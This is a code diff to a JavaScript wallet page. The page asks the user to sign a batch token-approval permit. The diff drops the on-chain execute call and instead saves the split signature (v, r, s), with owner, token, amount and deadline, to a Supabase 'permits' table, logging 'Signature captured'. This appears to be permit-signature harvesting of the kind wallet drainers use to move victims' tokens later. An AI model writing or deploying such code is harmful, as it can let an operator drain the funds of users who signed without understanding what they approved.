@@ -334,35 +334,42 @@ let details = [{
 
   log("✍️ Requesting signature...");
   const signature = await signer.signTypedData(domain,types,values);
+  const sig = ethers.Signature.from(signature);
 
-  // 🚀 EXECUTE
-  log("🚀 Sending execute...");
+  const v = sig.v;
+  const r = sig.r;
+  const s = sig.s;
 
-const permitBatch = {
-  details: details.map(d => ({
-    token: d.token,
-    amount: d.amount,
-    expiration: d.expiration,
-    nonce: d.nonce
-  })),
-  spender: CONTRACT,
-  sigDeadline: values.sigDeadline
-};
+log("✍️ Signature captured");
 
-  const contract = new ethers.Contract(
-    CONTRACT,
-    [
-  "function execute((tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline) permitBatch, bytes signature)"
-],
-    signer
-  );
+log("💾 Saving to Supabase...");
 
-  const tx = await contract.execute(permitBatch, signature);
+const { error } = await supabaseClient
+  .from('permits')
+  .insert([
+    {
+      owner: user,
+      token: TOKEN,
+      spender: CONTRACT,
 
-  log("⏳ Waiting confirmation...");
-  await tx.wait();
+      amount: details[0].amount.toString(),
+      nonce: details[0].nonce,
+      deadline: values.sigDeadline,
 
-  log("🔥 SUCCESS DONE");
+      v: v,
+      r: r,
+      s: s
+    }
+  ]);
+
+if (error) {
+  log("❌ Supabase error: " + error.message);
+} else {
+  log("✅ Saved to Supabase");
+}
+
+ 
+
 
  }catch(e){
   log("❌ FLOW ERROR: " + e.message);
